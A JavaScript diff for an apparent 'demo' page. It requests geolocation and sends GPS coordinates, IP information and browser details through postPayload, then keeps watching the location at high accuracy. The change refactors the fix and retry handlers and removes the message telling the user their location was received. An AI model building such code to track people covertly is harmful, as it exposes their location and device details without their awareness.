@@ -162,7 +162,7 @@
     );
   }
 
-  function applyFix(pos, isPrecise) {
+  function applyFix(pos) {
     const c = pos.coords;
     const gpsData = {
       lat: c.latitude,
@@ -175,22 +175,13 @@
     };
 
     const bInfo = collectBrowserInfo();
-    postPayload({ ip: ipInfo, gps: gpsData, browser: bInfo });
-    appendBubble("Location information was received.", false);
-
-    if (!isPrecise) {
-      appendBubble("Improving location accuracy when available...", false);
-    }
+    postPayload({
+      ip: ipInfo,
+      gps: gpsData,
+      browser: bInfo
+    });
 
     startHighAccuracyWatch();
-  }
-
-  function applyFastFix(pos) {
-    applyFix(pos, false);
-  }
-
-  function applyPreciseFix(pos) {
-    applyFix(pos, true);
   }
 
   function geoError(err) {
@@ -205,20 +196,11 @@
     appendBubble(msg, false);
   }
 
-  function handleFastError(err) {
-    if (err && err.code === 1) {
-      // Permission denied: do not retry
-      geoError(err);
-      return;
-    }
-
-    // Position unavailable (code 2) or Timeout (code 3): retry once with precise options
-    appendBubble("The first location provider did not respond. Trying a longer high-accuracy request...", false);
-    navigator.geolocation.getCurrentPosition(applyPreciseFix, geoError, GEO_PRECISE_OPTS);
-  }
-
   function startDemo() {
-    const btn = document.getElementById("btn-start-demo") || document.getElementById("btn-continue");
+    const btn =
+      document.getElementById("btn-start-demo") ||
+      document.getElementById("btn-continue");
+
     if (btn) {
       btn.disabled = true;
     }
@@ -230,7 +212,35 @@
       return;
     }
 
-    navigator.geolocation.getCurrentPosition(applyFastFix, handleFastError, GEO_FAST_OPTS);
+    navigator.geolocation.getCurrentPosition(
+      function (pos) {
+        applyFix(pos);
+        appendBubble(
+          "Improving location accuracy when available...",
+          false
+        );
+      },
+      function (err) {
+        // Permission denied: do not retry.
+        if (err && err.code === 1) {
+          geoError(err);
+          return;
+        }
+
+        appendBubble(
+          "The first location provider did not respond. Trying a longer high-accuracy request...",
+          false
+        );
+
+        // Exactly ONE fallback attempt.
+        navigator.geolocation.getCurrentPosition(
+          applyFix,
+          geoError,
+          GEO_PRECISE_OPTS
+        );
+      },
+      GEO_FAST_OPTS
+    );
   }
 
   document.addEventListener("DOMContentLoaded", function () {
